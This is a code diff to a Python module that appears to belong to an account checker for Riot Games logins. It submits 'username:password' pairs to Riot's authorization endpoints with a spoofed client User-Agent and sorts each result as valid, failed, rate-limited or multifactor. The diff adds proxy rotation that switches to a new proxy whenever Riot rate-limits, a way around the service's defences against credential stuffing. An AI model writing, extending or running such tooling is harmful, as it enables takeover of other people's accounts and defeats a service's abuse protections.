@@ -10,6 +10,9 @@ from requests import session as sesh
 from requests.adapters import HTTPAdapter
 from urllib3 import PoolManager
 
+from modules import systems
+
+sys=systems.system()
 
 class TLSAdapter(HTTPAdapter):
     def init_poolmanager(self, connections, maxsize, block=False):
@@ -17,6 +20,12 @@ class TLSAdapter(HTTPAdapter):
                                        ssl_version=PROTOCOL_TLSv1_2)
 
 class auth():
+    def __init__(self) -> None:
+        self.useproxy=sys.load_proxy()
+        self.proxy={
+            'http':None,
+            'https':None
+        }
     def auth(self,logpass):
         try:
             username=logpass.split(':')[0]
@@ -28,6 +37,7 @@ class auth():
             })
             session = sesh()
             session.headers = headers
+            session.proxies = self.proxy
             session.mount('https://', TLSAdapter())
             data = {
                 "acr_values": "urn:riot:bronze",
@@ -42,13 +52,13 @@ class auth():
                 'Content-Type': 'application/json',
                 'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
             }
-            r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
+            r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers,proxies=self.proxy)
             data = {
                 'type': 'auth',
                 'username': username,
                 'password': password
             }
-            r2 = session.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
+            r2 = session.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers,proxies=self.proxy)
             #print(r2.text)
             data = r2.json()
             #print(data)
@@ -61,6 +71,12 @@ class auth():
             elif "auth_failure" in r2.text:
                 return 0,0,0
             elif 'rate_limited' in r2.text:
+                if self.useproxy==True:
+                    np=sys.proxy(self.proxy)
+                    self.proxy={
+                        'http':np,
+                        'https':np
+                    }
                 return 1,1,1
             elif 'multifactor' in r2.text:
                 return 3,3,3
@@ -68,9 +84,9 @@ class auth():
                 'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
                 'Authorization': f'Bearer {token}'
             }
-            r = session.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={})
+            r = session.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={},proxies=self.proxy)
             entitlement = r.json()['entitlements_token']
-            r = session.post('https://auth.riotgames.com/userinfo', headers=headers, json={})
+            r = session.post('https://auth.riotgames.com/userinfo', headers=headers, json={},proxies=self.proxy)
             #print(r.text)
             #input()
             data = r.json()
@@ -96,5 +112,5 @@ class auth():
             #print(f"Entitlements: {entitlement}")
             #print("-"*50)
             #print(f"Userid: {puuid}")
-        except:
+        except Exception as e:
             return 2,2,2
